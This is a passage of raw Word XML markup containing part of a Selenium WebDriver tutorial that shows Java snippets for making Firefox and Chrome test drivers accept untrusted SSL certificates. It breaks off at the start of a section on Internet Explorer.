        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> object.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="642" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="643" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>ProfilesIni</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t xml:space="preserve"> prof = new </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>ProfilesIni</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w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:tab/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="644" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="645" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>FirefoxProfile</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ffProfile</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prof.getProfile</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myProfile</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>")</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="646" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="647" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step 3)</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>: Now we need to set "</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>setAcceptUntrustedCertificates</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>" and "</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>setAssumeUntrustedCertificateIssuer</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>" properties in the Fire Fox profile.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="648" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="649" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>ffProfile.setAcceptUntrustedCertificates</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 xml:space="preserve">true) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="650" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="651" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>ffProfile.setAssumeUntrustedCertificateIssuer</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false)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="652" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="653" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="654" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step 4)</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">: Now use the </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>FireFox</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> profile in the </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>FireFox</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> driver object.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="655" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="656" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>WebDriver</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t xml:space="preserve"> driver = new </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>FirefoxDriver</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ffProfile</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t xml:space="preserve">) </w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:tab/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="657" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="658" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Note</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>: "</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>setAcceptUntrustedCertificates</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>" and "</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>setAssumeUntrustedCertificateIssuer</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>"</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> are capabilities to handle the certificate errors in web browsers.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="659" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="660" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>SSL Certificate Error Handling in Chrome</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="661" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="662" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">For handling SSL error in Chrome, we need to use desired capabilities of Selenium </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Webdriver</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">. The below code will help to accept </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>all the</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> SSL certificate in chrome, and the user will not receive any SSL certificate related error using this code.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="663" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="664" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">We need to create instance of </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>DesiredCapabilities</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> class as below:-</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="665" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="666" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>DesiredCapabilities</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handlSSLErr</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t xml:space="preserve"> = </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>DesiredCapabilities.chrome</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t xml:space="preserve"> ()       </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="667" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="668" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>handlSSLErr.setCapability</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CapabilityType.ACCEPT_SSL_CERTS</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>, true)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="669" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="670" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>WebDriver</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t xml:space="preserve"> driver = new </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>ChromeDriver</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t xml:space="preserve"> (</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>handlSSLErr</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>);</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="671" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="672" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>SSL Certificate Error Handling in IE</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="673" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="674" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">Unlike handling SSL certificates in Chrome browser and Firefox, in IE, you may have to handle it using </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>javascript</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="675" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="676" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>To handle SSL certificate in IE, you can handle this situation in two ways,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="116"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="677" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="678" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>In this, you will click the link "</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Continue to this website (not recommended)".</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
